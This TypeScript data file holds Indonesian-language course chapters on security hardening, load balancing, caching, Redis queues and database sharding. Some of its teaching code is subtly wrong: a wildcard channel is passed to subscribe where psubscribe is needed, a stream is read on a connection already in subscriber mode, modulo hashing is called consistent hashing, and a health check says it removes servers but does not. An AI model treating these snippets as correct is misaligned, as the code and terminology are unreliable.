    moduleId: 26,

    chapterNum: "26.4",

    title: "Security Hardening dan Dependency Management",

    subtitle: "Amankan aplikasi dari supply chain attacks dan konfigurasi yang salah",

    level: "Menengah-Lanjut",

    objectives: [

      "Bisa melakukan security hardening",

      "Mengerti supply chain security",

      "Bisa setup automated security scanning",

    ],

    analogy: { diagram: "Security Hardening:\n├── HTTPS everywhere (HSTS)\n├── Security headers (CSP, X-Frame-Options)\n├── Dependency scanning (npm audit, Snyk)\n├── Secret management (.env, vault)\n├── Rate limiting\n└── Input validation (Zod)", caption: "Security adalah lapisan-lapisan proteksi — tidak ada silver bullet" },

    explanation: "Setelah menguasai ancaman utama, saatnya memikirkan security secara sistematis. Security bukan checklist satu kali — itu adalah continuous process.\\n\\n**HTTPS Everywhere**: Gunakan HTTPS untuk semua traffic. HSTS header memaksa browser selalu menggunakan HTTPS. Redirect HTTP ke HTTPS.\\n\\n**Supply Chain Security**: Dependency yang kamu install bisa jadi vector attack. npm audit untuk scan vulnerability.\n\nSnyk untuk continuous monitoring.\n\nLock files (package-lock.json, bun.lockb) untuk reproducible builds.\\n\\n**Secret Management**: Jangan hardcode API keys di kode.\n\nGunakan environment variables.\n\nUntuk production, gunakan secret management service (AWS Secrets Manager,\n\nHashiCorp Vault).\\n\\n**Rate Limiting**: Batasi request per IP/user untuk mencegah abuse dan brute force.\\n\\n**Input Validation**: Validasi SEMUA input — baik dari user maupun external API.\n\nZod adalah pilihan terbaik untuk TypeScript.",

    codeExample: { language: "bash", code: "# Dependency security scanning\nnpm audit  # Scan known vulnerabilities\nnpm audit fix  # Auto-fix where possible\n\n# Snyk CLI\nnpx snyk test  # Test for vulnerabilities\nnpx snyk monitor  # Continuous monitoring\n\n# Rate limiting dengan Hono\nimport { rateLimiter } from 'hono-rate-limiter';\n\napp.use('/api/*', rateLimiter({\n  windowMs: 15 * 60 * 1000, // 15 minutes\n  max: 100, // Limit each IP to 100 requests per windowMs\n  standardHeaders: true,\n  keyGenerator: (c) => c.req.header('x-forwarded-for') || c.req.ip,\n}));\n\n# Secret management — never commit .env\n# .env.example (safe to commit)\nDATABASE_URL=\nJWT_SECRET=\nOPENAI_API_KEY=\n\n# .env (gitignored — never commit!)\nDATABASE_URL=postgresql://...\nJWT_SECRET=super-secret-key\nOPENAI_API_KEY=sk-..." },

    explainAlong: "npm audit scan database vulnerability yang diketahui. rate-limiter membatasi request per IP untuk prevent abuse. .env.example sebagai template tanpa real values.",

    aiPrompt: "Setup automated security scanning di CI/CD pipeline: npm audit + Snyk scan sebelum deploy.",

    reflection: "Security adalah marathon, bukan sprint. Allocate 10-20% development time untuk security review dan improvement.",

  },

];



// ============================================================

// MODUL 27: SYSTEM DESIGN UNTUK WEB (4 chapters)

// ============================================================



const modul27: Chapter[] = [

  {

    id: "27.1",

    moduleId: 27,

    chapterNum: "27.1",

    title: "Fundamental System Design: Scale dari 1 ke 1 Juta User",

    subtitle: "Prinsip-prinsip dasar mendesain sistem web yang scalable",

    level: "Menengah-Lanjut",

    objectives: [

      "Mengerti komponen dasar arsitektur web scalable",

      "Bisa mengidentifikasi bottleneck dalam sistem",

      "Mengerti trade-off antara consistency, availability, dan partition tolerance",

    ],

    analogy: { diagram: "Scale Evolution:\n1 User -> Single Server (monolith)\n100 Users -> Load Balancer + 2 App Servers\n1,000 Users -> Database separate + Caching\n10,000 Users -> CDN + Read Replicas\n100,000 Users -> Microservices + Message Queue\n1,000,000 Users -> Multi-region + Sharding", caption: "Scaling adalah proses evolusi \u2014 setiap level punya challenge dan solusi berbeda" },

    explanation: "System design adalah kemampuan untuk merancang sistem software yang bisa menangani growth \\u2014 dari ratusan user sampai jutaan user. Ini adalah skill yang sangat dicari di level senior engineer ke atas.\\n\\n**Single Server (1-100 users)**: Semua komponen (web server, app logic, database) berjalan di satu mesin. Simple tapi tidak scalable.\\n\\n**Load Balancer (100-1,000 users)**: Traffic didistribusikan ke beberapa app server. Horizontal scaling.\n\nSession management jadi challenge \\u2014 solusi: sticky session atau shared session store (Redis).\\n\\n**Database Separation (1,000-10,000 users)**: Database dipisah dari app server. Masing-masing bisa di-scale independently. Read replicas untuk offload read queries.\\n\\n**Caching Layer (10,000-100,000 users)**: Redis/Memcached untuk cache frequently accessed data. CDN untuk static assets.\n\nDatabase query optimization.\\n\\n**Microservices (100,000-1,000,000 users)**: Monolith dipecah ke services kecil.\n\nIndependent deploy, independent scale.\n\nTapi tambah complexity: service discovery, inter-service communication, distributed tracing.\\n\\n**CAP Theorem**: Dalam distributed system,\n\nKamu hanya bisa pilih 2 dari 3 \\u2014 Consistency (semua node lihat data sama), Availability (selalu respond), Partition Tolerance (tetap berfungsi meski network failure).",

    codeExample: { language: "typescript", code: "// Simple load balancer simulation dengan Hono\nimport { Hono } from 'hono';\n\nconst app = new Hono();\n\n// Round-robin load balancer\nconst servers = ['http://server1:3000', 'http://server2:3000', 'http://server3:3000'];\nlet currentIndex = 0;\n\napp.all('*', async (c) => {\n  const target = servers[currentIndex];\n  currentIndex = (currentIndex + 1) % servers.length;\n  \n  // Forward request ke target server\n  const response = await fetch(target + c.req.path, {\n    method: c.req.method,\n    headers: c.req.header(),\n    body: c.req.raw.body,\n  });\n  \n  return response;\n});\n\n// Health check\nsetInterval(async () => {\n  for (const server of servers) {\n    try {\n      await fetch(server + '/health', { signal: AbortSignal.timeout(5000) });\n      console.log(`\u2705 ${server} healthy`);\n    } catch {\n      console.log(`\u274c ${server} unhealthy \u2014 removing from pool`);\n      // Remove unhealthy server and alert\n    }\n  }\n}, 30000);" },

    explainAlong: "Round-robin adalah algoritma load balancing paling simple \u2014 distribusi sequential ke setiap server. Health check penting untuk mendeteksi server yang down dan menghindari mengirim traffic ke server mati.",

    aiPrompt: "Desain arsitektur untuk aplikasi e-commerce yang mulai dari 1.000 user dan target 100.000 user dalam 6 bulan. Identifikasi bottleneck di setiap fase growth.",

    reflection: "Tidak ada arsitektur yang sempurna \u2014 hanya arsitektur yang tepat untuk requirement dan constraint saat ini. Avoid premature optimization, tapi design for scale.",

  },

  {

    id: "27.2",

    moduleId: 27,

    chapterNum: "27.2",

    title: "Caching Strategies: Dari Browser sampai Database",

    subtitle: "Multi-layer caching untuk performa maksimal",

    level: "Menengah-Lanjut",

    objectives: [

      "Mengerti berbagai layer caching dalam arsitektur web",

      "Bisa memilih caching strategy yang tepat",

      "Mengerti cache invalidation dan eviction policies",

    ],

    analogy: { diagram: "Caching Layers (CDN -> Browser -> App -> Database):\n1. CDN Cache (CloudFlare) -> Static assets, TTL 1h\n2. Browser Cache -> Cache-Control headers\n3. Application Cache (Redis) -> Computed data, TTL 5m\n4. Database Cache (Query Cache) -> Frequent queries\n5. ORM Cache -> Entity cache", caption: "Caching adalah salah satu teknik paling efektif untuk meningkatkan performa \u2014 tapi juga sumber bug paling umum" },

    explanation: "Caching adalah teknik menyimpan data di lokasi yang lebih dekat ke consumer sehingga akses lebih cepat.\n\nTapi caching juga membuat sistem lebih kompleks \\u2014 cache invalidation adalah salah satu dari dua hal tersulit dalam computer science (bersama naming things dan off-by-one errors).\\n\\n**CDN Cache (Layer 1)**: CDN (Content Delivery Network) menyimpan static assets (gambar, CSS, JS, video) di edge servers di seluruh dunia.\n\nUser mengakses dari edge terdekat \\u2014 latency jauh lebih rendah.\n\nTTL (Time To Live) menentukan berapa lama asset di-cache.\\n\\n**Browser Cache (Layer 2)**: Browser menyimpan asset berdasarkan HTTP cache headers \\u2014 Cache-Control (max-age, no-cache,\n\nNo-store), ETag (content hash untuk conditional request), Last-Modified.\\n\\n**Application Cache (Layer 3)**: Redis/Memcached menyimpan computed data, session, rate limit counters.\n\nPatterns: Cache-aside (app cek cache \\u2192 miss \\u2192 fetch DB \\u2192 store cache), Write-through (tulis ke cache dan DB bersamaan), Write-behind (tulis ke cache, async ke DB).\\n\\n**Cache Invalidation**: Cache warming (pre-populate saat startup),\n\nTTL-based (expire otomatis), Event-based (invalidate saat data berubah), Version-based (cache key include version number).\\n\\n**Eviction Policies**: LRU (Least Recently Used \\u2014 paling umum), LFU (Least Frequently Used), FIFO (First In First Out), Random.",

    codeExample: { language: "typescript", code: "// Cache-aside pattern dengan Redis\nimport { Redis } from 'ioredis';\nconst redis = new Redis(process.env.REDIS_URL);\n\nasync function getUserWithCache(userId: string) {\n  const cacheKey = `user:${userId}`;\n  \n  // 1. Cek cache dulu\n  const cached = await redis.get(cacheKey);\n  if (cached) {\n    console.log('[CACHE] Cache hit');\n    return JSON.parse(cached);\n  }\n  \n  // 2. Cache miss \u2192 fetch dari database\n  console.log('[CACHE] Cache miss \u2192 querying DB');\n  const user = await db.select().from(users).where(eq(users.id, userId)).limit(1);\n  \n  if (user.length) {\n    // 3. Store ke cache untuk request berikutnya\n    await redis.setex(cacheKey, 300, JSON.stringify(user[0])); // TTL 5 menit\n  }\n  \n  return user[0] ?? null;\n}\n\n// Cache invalidation saat data berubah\nasync function updateUser(userId: string, data: Partial<User>) {\n  // Update database\n  await db.update(users).set(data).where(eq(users.id, userId));\n  \n  // Invalidate cache\n  await redis.del(`user:${userId}`);\n  \n  // Jika ada cache list yang include user ini, invalidate juga\n  await redis.del('users:list');\n}" },

    explainAlong: "Cache-aside: app bertanggung jawab mengelola cache. Setex untuk store dengan TTL. Del untuk invalidate saat data berubah. Pattern ini paling flexible tapi ada race condition window antara DB write dan cache invalidation.",

    aiPrompt: "Implementasikan write-through caching pattern untuk product catalog. Bandingkan latency dan consistency dengan cache-aside pattern.",

    reflection: "Caching bisa meningkatkan performa 10-100x, tapi selalu pertimbangkan: apa yang terjadi kalau cache down? Sistem harus tetap berfungsi (graceful degradation).",

  },

  {

    id: "27.3",

    moduleId: 27,

    chapterNum: "27.3",

    title: "Message Queue dan Asynchronous Processing",

    subtitle: "Decouple services dan handle background tasks dengan message queue",

    level: "Menengah-Lanjut",

    objectives: [

      "Mengerti konsep message queue dan pub/sub",

      "Bisa mengimplementasikan async processing",

      "Mengerti delivery guarantees dan retry mechanisms",

    ],

    analogy: { diagram: "Message Queue:\nProducer -> Queue -> Consumer\n\nPub/Sub:\nPublisher -> Topic -> [Subscriber A, Subscriber B, Subscriber C]", caption: "Message queue memisahkan producer dan consumer \u2014 mereka tidak perlu tahu keberadaan satu sama lain" },

    explanation: "Message queue adalah komponen arsitektur yang memungkinkan services berkomunikasi secara asynchronous.\n\nProducer mengirim message ke queue, consumer memproses message dari queue.\n\nMereka tidak perlu online bersamaan \\u2014 queue menyimpan message sampai consumer siap memproses.\\n\\n**Use Cases**: Background jobs (email sending, image processing, report generation), decouple microservices, handle traffic spikes (buffer messages saat consumer sibuk), event-driven architecture.\\n\\n**Queue Patterns**: Point-to-point (satu message diproses oleh satu consumer \\u2014 task distribution),\n\nPub/Sub (satu message diproses oleh banyak subscriber \\u2014 event broadcasting).\\n\\n**Delivery Guarantees**: At-most-once (message bisa hilang, tidak perlu retry), At-least-once (message pasti terkirim, bisa duplikat \\u2014 consumer harus idempotent), Exactly-once (paling sulit \\u2014 perlu deduplication mechanism).\\n\\n**Retry dan Dead Letter Queue**: Kalau processing gagal, retry dengan exponential backoff (tunggu 1s, 2s, 4s, 8s...).\n\nSetelah max retries, kirim ke Dead Letter Queue (DLQ) untuk investigasi manual.\\n\\n**Message Brokers**: Redis List/Streams (simple,\n\nCepat), RabbitMQ (feature-rich, AMQP), Apache Kafka (high throughput, persistent, streaming), AWS SQS (managed, serverless).",

    codeExample: { language: "typescript", code: "// Redis Pub/Sub untuk real-time notifications\nimport { Redis } from 'ioredis';\nconst pub = new Redis(process.env.REDIS_URL);\nconst sub = new Redis(process.env.REDIS_URL);\n\n// Publisher\nasync function publishNotification(userId: string, message: string) {\n  await pub.publish(`notifications:${userId}`, JSON.stringify({\n    id: crypto.randomUUID(),\n    message,\n    timestamp: Date.now(),\n  }));\n}\n\n// Subscriber (WebSocket server)\nsub.subscribe('notifications:*');\nsub.on('message', (channel, message) => {\n  const data = JSON.parse(message);\n  const userId = channel.split(':')[1];\n  \n  // Kirim ke WebSocket connections user tersebut\n  const connections = wsConnections.get(userId);\n  connections?.forEach(ws => ws.send(JSON.stringify(data)));\n});\n\n// Message Queue dengan Redis Streams (lebih robust dari List)\nasync function enqueueJob(queue: string, job: object) {\n  await pub.xadd(queue, '*', 'data', JSON.stringify(job));\n}\n\nasync function processJobs(queue: string, handler: (job: any) => Promise<void>) {\n  while (true) {\n    const messages = await sub.xreadgroup(\n      'GROUP', 'workers', `worker-${process.pid}`,\n      'BLOCK', 5000, 'STREAMS', queue, '>'\n    );\n    \n    for (const [, entries] of messages || []) {\n      for (const [id, [, data]] of entries) {\n        try {\n          await handler(JSON.parse(data));\n          await sub.xack(queue, 'workers', id); // Acknowledge\n        } catch (error) {\n          // Retry logic atau kirim ke DLQ\n          console.error(`Job ${id} failed:`, error);\n        }\n      }\n    }\n  }\n}" },

    explainAlong: "xadd untuk menambah message ke stream. xreadgroup untuk consumer group processing \u2014 multiple workers bisa memproses dari queue yang sama. xack untuk acknowledge message sudah berhasil diproses.",

    aiPrompt: "Implementasikan email queue dengan retry mechanism dan dead letter queue. Saat email gagal setelah 3 retries, simpan ke DLQ untuk review manual.",

    reflection: "Async processing membuat sistem lebih resilient terhadap failure. Tapi tambah complexity: monitoring queue depth, handling poison messages, dan ensuring eventual consistency.",

  },

  {

    id: "27.4",

    moduleId: 27,

    chapterNum: "27.4",

    title: "Database Sharding, Replication, dan Distributed Systems",

    subtitle: "Scale database dan menangani distributed system challenges",

    level: "Lanjut",

    objectives: [

      "Mengerti database sharding strategies",

      "Bisa mendesain distributed database architecture",

      "Mengerti distributed system challenges dan solusinya",

    ],

    analogy: { diagram: "Database Scaling:\nVertical -> Bigger server (CPU/RAM/disk)\nHorizontal:\n  \u251c\u2500\u2500 Read Replication -> Master writes, replicas read\n  \u251c\u2500\u2500 Sharding -> Split data across servers\n  \u2514\u2500\u2500 Federation -> Split by function (users_db, orders_db)", caption: "Vertical scaling punya limit fisik \u2014 horizontal scaling adalah jangka panjang, tapi jauh lebih kompleks" },

    explanation: "Ketika single database server tidak bisa handle load, kita perlu scale horizontally. Ada beberapa strategi dengan trade-off berbeda.\\n\\n**Read Replication**: Master server menerima semua writes, replica servers menerima reads. Cocok untuk read-heavy workload (80%+ reads). Replication lag bisa jadi issue \\u2014 data di replica mungkin sedikit outdated.\\n\\n**Database Sharding**: Memisahkan data ke multiple database servers berdasarkan shard key.\n\nStrategies: Range-based (user_id 1-1M di shard A, 1M-2M di shard B \\u2014 hot spot risk), Hash-based (hash(user_id) % N \\u2014 distribusi merata, tapi resharding sulit),\n\nDirectory-based (lookup table menentukan shard \\u2014 flexible, tapi single point of lookup).\\n\\n**Federation**: Memisahkan database berdasarkan domain \\u2014 users database, orders database, products database.\n\nCocok untuk microservices architecture.\\n\\n**Distributed Challenges**: Data consistency across shards (two-phase commit, Saga pattern), Cross-shard queries (joins jadi sulit, perlu application-level join), Resharding (ketika shard penuh \\u2014 online resharding tanpa downtime),\n\nGlobal secondary indexes (query berdasarkan non-shard-key field).\\n\\n**Anti-Patterns**: Shared database antara services (coupling), Sharding tanpa business justification (premature optimization), Cross-shard transactions (sebisa dihindari, gunakan Saga pattern).",

    codeExample: { language: "typescript", code: "// Consistent hashing untuk sharding\nclass ShardRouter {\n  private shards: string[];\n  \n  constructor(shardUrls: string[]) {\n    this.shards = shardUrls;\n  }\n  \n  getShard(key: string): string {\n    const hash = this.hashCode(key);\n    const index = Math.abs(hash) % this.shards.length;\n    return this.shards[index];\n  }\n  \n  private hashCode(str: string): number {\n    let hash = 0;\n    for (let i = 0; i < str.length; i++) {\n      hash = ((hash << 5) - hash) + str.charCodeAt(i);\n      hash |= 0;\n  }\n    return hash;\n  }\n}\n\n// Penggunaan\nconst router = new ShardRouter([\n  'postgresql://shard1/db',\n  'postgresql://shard2/db',\n  'postgresql://shard3/db',\n]);\n\nfunction getUserShard(userId: string) {\n  return router.getShard(userId);\n}\n\n// Saga pattern untuk distributed transaction\nasync function createOrderSaga(orderData: OrderData) {\n  const steps = [\n    { service: 'inventory', action: 'reserve', compensate: 'release' },\n    { service: 'payment', action: 'charge', compensate: 'refund' },\n    { service: 'shipping', action: 'create', compensate: 'cancel' },\n  ];\n  \n  const completed: string[] = [];\n  \n  try {\n    for (const step of steps) {\n      await executeStep(step.service, step.action, orderData);\n      completed.push(step.service);\n    }\n  } catch (error) {\n    // Compensating transaction: undo semua step yang sudah berhasil\n    for (const service of completed.reverse()) {\n      const step = steps.find(s => s.service === service)!;\n      await executeStep(service, step.compensate, orderData);\n    }\n    throw new Error(`Order failed, compensated: ${error}`);\n  }\n}" },

    explainAlong: "Consistent hashing: hash shard key, modulo jumlah shard untuk menentukan target. Saga pattern: eksekusi step sequential, kalau gagal jalankan compensating transaction untuk undo step yang sudah berhasil.",

    aiPrompt: "Desain sharding strategy untuk platform e-commerce dengan 10 juta users dan 100 juta orders. Pilih shard key yang tepat dan rencanakan resharding strategy.",

    reflection: "Distributed systems secara fundamental lebih kompleks dari monolith. Jangan distributed kalau belum perlu. Premature database scaling adalah anti-pattern \u2014 scale kalau metrics menunjukkan bottleneck, bukan karena mungkin butuh.",

  },

];



// ============================================================

// EXPORT ALL CHAPTERS

// ============================================================



export const allChapters: Chapter[] = [

  ...modul1,

  ...modul2,

  ...modul3,

  ...modul4,

  ...modul5,

  ...modul6,

  ...modul7,

  ...modul8,

  ...modul9,

  ...modul10,

  ...modul11,

  ...modul12,

  ...modul13,

  ...modul14,

  ...modul15,

  ...modul16,

  ...modul17,

  ...modul18,

  ...modul19,

  ...modul20,

  ...modul21,

  ...modul22,

  ...modul23,

  ...modul24,

  ...modul25,

  ...modul26,

  ...modul27,

];

export const chapters = allChapters;

// ============================================================

// HELPER FUNCTIONS

// ============================================================



export function getModuleChapters(moduleId: number): Chapter[] {

  return allChapters.filter((c) => c.moduleId === moduleId);

}



export function getChapter(moduleId: number, chapterId: string): Chapter | undefined {

  return allChapters.find((c) => c.moduleId === moduleId && c.chapterNum === chapterId);
}
